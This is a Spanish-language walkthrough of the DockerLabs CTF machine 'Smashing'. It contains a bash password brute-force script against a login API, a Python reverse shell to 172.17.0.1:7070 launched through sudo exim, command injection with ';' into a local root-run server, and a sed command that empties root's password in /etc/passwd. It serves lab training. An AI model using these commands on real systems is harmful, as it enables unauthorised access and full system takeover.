

Máquina **Smashing** de la plataforma [DockerLabs](https://dockerlabs.es)

Autor: [Darksblack](https://github.com/darksblacksk)

Dificultad: Dificil

![Smashing](images/smashing/smashing.png)

# Reconocimiento

Comenzaremos haciendo un escaneo de `nmap` para descubrir los puertos abiertos de la máquina:

```css
nmap -p- --open --min-rate 5000 -sS -sC -sV -n -Pn -vvv 172.17.0.2 -oN targeted
```

`-p-`: Para indicarle a `nmap` que abarque el rango de 65535 puertos en total.

`--open`:  Para indicar que solo queremos que nos muestre los puertos abiertos.

`--min-rate 5000`: Para indicarle a `nmap` que queremos tramitar paquetes no menores a 5000 paquetes por segundo.

`-sS`: Para aplicar un escaneo de tipo `SYN Stealth scan`.

`-sC`: Para aplicar unos scripts básicos de reconocimiento.

`-sV`: Para poder identificar la versión de los servicios que encontremos abiertos.

`-vvv`: Esto para que a medida que va encontrando los puertos nos lo imprima por el terminal.

`-oN`: Para exportar el escaneo en formato nmap (osea como se nos imprime por consola).

```ruby
# Nmap 7.95 scan initiated Sun Mar  2 11:16:03 2025 as: nmap -p22,80 -sCV -oN targeted 172.17.0.2
Nmap scan report for gitea.dl (172.17.0.2)
Host is up (0.00020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 8e:f8:76:54:88:0f:c9:04:8c:72:ff:6c:43:57:3e:cb (ECDSA)
|_  256 f9:e7:95:81:58:57:a1:cc:b1:78:96:06:5c:17:1d:ca (ED25519)
80/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Did not follow redirect to http://cybersec.dl
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar  2 11:16:10 2025 -- 1 IP address (1 host up) scanned in 6.96 seconds
```

Podemos ver 2 puertos abiertos:

• `Puerto 22: OpenSSH 9.2p1 Debian`

• `Puerto 80: Werkzeug 2.2.2 Python 3.11.2`

como la versión de `OpenSSH` es superior a la 7.7 no podemos enumerar usuarios ni hacer nada interesante, por lo que continuaremos al puerto 80.

#### Puerto 80

En el puerto 80 podemos ver un dominio, por lo que lo agregamos al archivo `/etc/hosts`:

```css
echo "172.17.0.2 cybersec.dl" >> /etc/hosts
```

Una vez agregado, podemos entrar a la web y vemos una que es bastante simple, con una temática de empresa de ciberseguridad. Si revisamos el código fuente, podemos ver algo interesante en la línea 115:

```javascript
            fetch('/api/1passwsecu0')
```

viendo esto, podemos saber que hay una api, solo que ahora necesitamos encontrar endpoints, y para esto usaremos `feroxbuster`:

```css
feroxbuster -u "http://cybersec.dl/api/" -w directory-list-2.3-medium.txt -n --no-state -t 200
```

`-n`: Para que no haga fuzzing de manera recursiva al encontrar un directorio.

`--no-state`: Para que no nos deje un archivo de log.

`-t 200`: Para aplicar 200 hilos.

```css
                                                                                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cybersec.dl/api/
 🚀  Threads               │ 200
 📖  Wordlist              │ directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
405      GET        5l       20w      153c http://cybersec.dl/api/login
[####################] - 54s     4370/220545  8m      found:1       errors:0      
[####################] - 54s     4362/220545  449/s   http://cybersec.dl/api/  
```

como podemos ver, tenemos un endpoint de "login", por lo que haremos una petición con `curl` para ver que hace:

```css
curl http://cybersec.dl/api/login
```

```css
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

nos sale un mensaje de "Method Not Allowed", esto significa que la petición que espera ese endpoint no es `GET`, por lo que puede ser `POST`:

```css
curl -X POST http://cybersec.dl/api/login
```

```css
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>Did not attempt to load JSON data because the request Content-Type was not &#39;application/json&#39;.</p>
```

ahora si funciona, pero espera un `Content-Type` en json:

```css
curl -X POST 'http://cybersec.dl/api/login' --header "Content-Type: application/json" --data '{"username":"admin", "password":"admin"}'
```

ponemos "username" y "password" porque al ser un login probablemente pida esos datos:

```json
{
  "message": "Invalid credentials"
}
```

ahora que sabemos como autenticarnos, vamos a realizar un script que haga fuerza bruta a la contraseña:

```bash
#!/bin/bash



wordlist=$1
rojo='\033[1;31m'
verde='\033[1;32m'
reset='\033[0m'


echo -e "${rojo}Creditos: https://github.com/maciferna${reset}"

sleep 2

if [ $# != 1 ]; then
  echo -e "\n${rojo}Error\n${verde}Uso: $0 <wordlist>${reset}\n"
  exit 1
fi


lineas=$(wc -l $wordlist | awk '{print $1}')
intentos=0


salir(){
  echo -e "\n${rojo}Saliendo...${reset}\n"
  exit 0
}


trap salir SIGINT



while IFS= read -r password; do
  respuesta=$(curl -X POST 'http://cybersec.dl/api/login' --header "Content-Type: application/json" --data "{\"username\":\"admin\", \"password\":\"$password\"}" -s)


  if [ $(echo $respuesta | grep -ci "invalid") = 0 ]; then
    echo -e "\n\n\n${rojo}Credenciales encontradas: ${verde}admin:$password${reset}\n\n\n"
    echo -e "${rojo}Respuesta: ${reset}\n"
    echo $respuesta | jq
    exit 0
  else
    intentos=$(($intentos+1))
    echo -ne "${rojo}$intentos/$lineas${reset}\r"
  fi

done < "$wordlist"
```

lo ejecutamos:

```css
bash force.sh /opt/rockyou.txt
```

y encontramos las credenciales:

```css

Credenciales encontradas: admin:undertaker



Respuesta: 

{
  "company": {
    "URLs_web": "cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.dl/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.dl/documents, cybersec.dl/api/cpu, cybersec.dl/api/login",
    "address": "New York, EEUU",
    "branches": "Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland",
    "customers": "ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk",
    "name": "CyberSec Corp",
    "phone": "+1322302450134200",
    "services": "Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad"
  },
  "message": "Login successful"
}
```

de todo esto, solo vemos una cosa interesante, y son los subdominios:

```json
"URLs_web": "cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.dl/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.dl/documents, cybersec.dl/api/cpu, cybersec.dl/api/login"
```

de todos estos (luego de probar todos :( ), los únicos que son válidos son los siguientes:

```css
mail.cybersec.dl
0internal_down.cybersec.dl
```

pero el único que nos interesa es el segundo, ya que nos permite descargar una nota y un binario. La nota tiene 2 cosas interesantes:

 1• Enumeración de usuarios: flipsy & darksblack

 2• Leak de información: El binario guarda una contraseña para el usuario flipsy.

Sabiendo esto, pasaremos a hacer ingeniería inversa.

# Intrusión

#### Ingeniería inversa

En este punto, la idea de la máquina es explotar un buffer overflow, el problema es que este es bastante complicado, ya que tiene canarios, pie y nx. Viendo que es bastante difícil, se puede hacer ingeniería inversa para hacer que el binario haga lo que queramos, pero no puedo mostrar el proceso ya que estaría arruinando la manera intencionada de la máquina xD, pero si dejaré el [binario modificado](https://github.com/maciferna/gitbook/blob/main/writeups/dockerlabs/scripts/smashing/pwned) para descargar.

Lo ejecutamos y vemos lo siguiente:

![Pwned](images/smashing/pwned.png)

pasamos ese texto por [CyberChef](https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=MnRQNDJiU3pCVG5tRUF1QUdreGoz) y vemos la contraseña `Chocolate.1704` por lo que nos conectamos por ssh con el usuario "flipsy".

```css
ssh flipsy@172.17.0.2
```

# Escalada De Privilegios

### Flipsy

Si ejecutamos `sudo -l` veremos que podemos ejecutar `exim` como el usuario darksblack, por lo que creamos una shell en `/tmp` y luego la ejecutamos con exim:

```css
echo '#!/bin/sh' > /tmp/shell && echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",7070));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'" >> /tmp/shell && chmod 777 /tmp/shell
```

escuchamos por el puerto 7070:

```css
nc -nlvp 7070
```

y luego ejecutamos la shell:

```css
sudo -u darksblack exim -be '${run{/tmp/shell}}'
```

### Darksblack

Al ejecutar `id`, podremos ver que nos encontramos en el grupo "cyber", por lo que buscaremos archivos que pertenezcan al grupo:

```css
find / -group cyber 2>/dev/null
```

```css
/var/www/html/serverpi.py
```

tenemos un script de python, el cual al leerlo contiene un texto muy grande en base64, el cual leeremos en nuestra máquina con el siguiente comando:

```css
echo 'aW1wb3J0IGh0dHAuc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgYmFzZTY0CgpQT1JUID0gMjUwMDAKCkFVVEhfS0VZX0JBU0U2NCA9ICJNREF3TUdONVltVnljMlZqWDJkeWIzVndYM0owWHpBd01EQXdNQW89IgoKY2xhc3MgSGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgogICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICBhdXRoX2hlYWRlciA9IHNlbGYuaGVhZGVycy5nZXQoJ0F1dGhvcml6YXRpb24nKQoKICAgICAgICBpZiBhdXRoX2hlYWRlciBpcyBOb25lIG9yIG5vdCBhdXRoX2hlYWRlci5zdGFydHN3aXRoKCdCYXNpYycpOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAxKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiQXV0aG9yaXphdGlvbiBoZWFkZXIgaXMgbWlzc2luZyBvciBpbmNvcnJlY3QiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBFeHRyYWVyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUgKGVuIEJhc2U2NCkKICAgICAgICBlbmNvZGVkX2tleSA9IGF1dGhfaGVhZGVyLnNwbGl0KCdCYXNpYyAnKVsxXQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGFsbWFjZW5hZGEgZW4gQmFzZTY0CiAgICAgICAgZGVjb2RlZF9zdG9yZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShBVVRIX0tFWV9CQVNFNjQpLmRlY29kZSgpLnN0cmlwKCkgICMgRWxpbWluYXIgc2FsdG9zIGRlIGzDrW5lYQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUKICAgICAgICBkZWNvZGVkX2NsaWVudF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfa2V5KS5kZWNvZGUoKS5zdHJpcCgpICAjIEVsaW1pbmFyIHNhbHRvcyBkZSBsw61uZWEKCiAgICAgICAgIyBDb21wYXJhciBsYXMgY2xhdmVzCiAgICAgICAgaWYgZGVjb2RlZF9jbGllbnRfa2V5ICE9IGRlY29kZWRfc3RvcmVkX2tleToKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDQwMykKICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIkludmFsaWQgYXV0aG9yaXphdGlvbiBrZXkiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBQcm9jZXNhciBlbCBwYXLDoW1ldHJvICdleGVjJwogICAgICAgIHBhcnNlZF9wYXRoID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKHNlbGYucGF0aCkKICAgICAgICBxdWVyeV9wYXJhbXMgPSB1cmxsaWIucGFyc2UucGFyc2VfcXMocGFyc2VkX3BhdGgucXVlcnkpCgogICAgICAgIGlmICdleGVjJyBpbiBxdWVyeV9wYXJhbXM6CiAgICAgICAgICAgIGNvbW1hbmQgPSBxdWVyeV9wYXJhbXNbJ2V4ZWMnXVswXQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBhbGxvd2VkX2NvbW1hbmRzID0gWydscycsICd3aG9hbWknXQogICAgICAgICAgICAgICAgaWYgbm90IGFueShjb21tYW5kLnN0YXJ0c3dpdGgoY21kKSBmb3IgY21kIGluIGFsbG93ZWRfY29tbWFuZHMpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSg0MDMpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJDb21tYW5kIG5vdCBhbGxvd2VkLiIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoY29tbWFuZCwgc2hlbGw9VHJ1ZSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShyZXN1bHQpCiAgICAgICAgICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDUwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShlLm91dHB1dCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAwKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiTWlzc2luZyAnZXhlYycgcGFyYW1ldGVyIGluIFVSTCIpCgp3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIxMjcuMC4wLjEiLCBQT1JUKSwgSGFuZGxlcikgYXMgaHR0cGQ6CiAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkK' | base64 -d > codigo.py
```

luego de eso, revisamos el script resultante, y veremos que es otro código en python, pero de un servidor que corre de manera local por el puerto 25000, y nos permite ejecutar "ls" y "whoami" pero solo si nos autenticamos con la clave que nos dan mas arriba. Sabiendo esto, y viendo que la máquina tiene `curl` instalado, hacemos una petición con la autenticación que nos pide y vemos que somos root:

```css
$ curl 'http://127.0.0.1:25000/?exec=whoami' -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo=" 
root
$ 
```

viendo esto, intentamos hacer un bypass con un ";" y vemos que funciona:

```css
$ curl 'http://127.0.0.1:25000/?exec=whoami;id' -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo="
root
uid=0(root) gid=0(root) groups=0(root)
$ 
```

por lo que ahora solo ejecutamos un comando que nos haga escalar a root:

```css
curl 'http://127.0.0.1:25000/?exec=whoami;sed%20s/root:x:/root::/g%20-i%20/etc/passwd' -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo=" && su
```

y ya seremos root.

### Root

![Root](images/smashing/root.png)

Gracias por leer ;)
